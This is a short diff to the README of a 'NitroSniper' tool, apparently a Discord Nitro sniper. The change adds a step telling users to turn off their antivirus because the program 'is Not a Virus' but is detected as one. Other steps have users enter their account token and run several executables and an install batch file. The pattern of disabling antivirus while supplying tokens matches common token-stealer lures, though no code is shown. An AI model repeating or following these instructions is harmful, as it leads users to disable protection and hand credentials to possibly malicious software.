@@ -25,7 +25,7 @@
 
 ## Usage:
 
-1. First Open The "Settings.json" And Change your Token in line 3 "YOUR TOKEN HERE"
+1. First Turn off your Anti Virus (its Not a Virus but it detects it as one) and then Open The "Settings.json" And Change your Token in line 3 "YOUR TOKEN HERE"
 2. Second Open The "NitroSniper.exe"
 3. Third Open The Folder Named "Extension For NitroSniper" and open the "config.json" file and change your token on line 2
 4. Fourth open the "install.bat" file and then the "Main.exe" and "Main.py" File
